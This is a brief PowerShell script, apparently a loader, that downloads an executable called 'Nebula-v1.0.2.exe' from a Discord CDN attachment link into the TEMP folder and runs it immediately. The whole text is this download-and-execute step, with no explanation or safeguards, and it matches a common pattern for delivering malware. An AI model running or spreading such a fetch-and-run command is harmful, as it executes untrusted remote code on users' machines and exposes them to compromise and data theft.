$downloadUrl = "https://cdn.discordapp.com/attachments/1164969892013936710/1300447431070318703/Nebula-v1.0.2.exe?ex=6720df8c&is=671f8e0c&hm=8fe9b811b0d90e7774a9aa0c11a48586ca5bd9847d1bdb9bfe39beb87880fae8&"
$outputPath = "$env:TEMP\Nebula-v1.0.2.exe"

Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath
Start-Process -FilePath $outputPath
